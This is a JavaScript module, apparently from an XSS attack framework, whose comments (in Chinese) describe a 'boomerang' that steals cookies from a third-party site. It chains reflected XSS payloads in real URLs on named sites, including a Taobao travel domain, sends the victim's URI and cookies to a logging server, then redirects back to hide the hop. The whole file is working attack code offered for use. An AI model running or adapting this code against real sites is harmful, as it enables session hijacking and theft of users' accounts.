////////////////////////////////////////////////////////
// boomerang 回旋镖模块，获取第三方远程站点的cookie
// 并将页面重定向回当前页面
// 要求远程站点存在一个xss
// 似乎在本模块中第三方站点很难加载上 base64.js
///////////////////////////////////////////////////////
//alert("Boomerang.js 回旋镖模块");

// feedurl 在base.js中定义
var target_domain = "jipiao.taobao.com";
//var target="http://www.b.com/4.html#'><script src=\'"+feedurl+"\' ></script><'"; 
var target="http://jipiao.taobao.com/hotel/search_hotel.htm?_fmho.h._0.d=%CE%E4%BA%BA&_fmho.h._0.c=2008-11-30&_fmho.h._0.ch=2008-12-01&_fmho.h._0.p=&_fmho.h._0.h=&_fmho.h._0.ho=&_fmho.h._0.hot=&_fmho.h._0.hote=&_fmho.h._0.de=WUH%3F%22%3E<script src=\'"+feedurl+"\' ></script>";
//var target="http://www.underwoodlandcompany.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
//var target="http://www.waikikicondosearch.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
//var target="http://www.gobolinux.org/?page=<script src="+feedurl+"></script>";

// 前页面
var org_url = "http://www.playback.fr/recherche.php?search=<script%20src=http://www.secwiki.com/athena/feed.js%20></script>+&button=OK";  
var org_domain = "www.playback.fr";

////////////////////////////////////////////////////////////
// 开始执行功能
///////////////////////////////////////////////////////////

// 如果是当前页面，则向目标提交
if ($d.domain == org_domain){
   if ($d.cookie.indexOf("xsstag=1") < 0){
	 // 在cookie里做标记，只弹一次
	 $d.cookie="xsstag=1; "+$d.cookie;
        //alert(target);
        try {
            formpostTarget(target);
        } catch (e){
            //alert(e);
        }
   }
}

//////////////////////////////////////////////////////////
// 如果是目标站点，则重定向回前页面 
if ($d.domain == target_domain){
	
   //var param = "[**** Request URI: "+window.location.href+" ****]\r\n    [**** Cookie: "+document.cookie+" ****]";  // 传递回server的参数
   var param = XssGotURI+XssGotCookie;  // 传递回server的参数
   //alert(param);
   //param = base64encode(param); // base64 加密参数传输

   // 发送cookie 和 uri 回 server
   getURL(logurl+param);

   //////////////////////////////////////////////////////
   // 返回原来的页面。
   formpostTarget(org_url);
}

//////////////////////////////////////////////////////////////
// 这里有时间问题，太短可能导致lib加载失败,导致页面打不开
// 所以直接把一些用到的函数写在这里
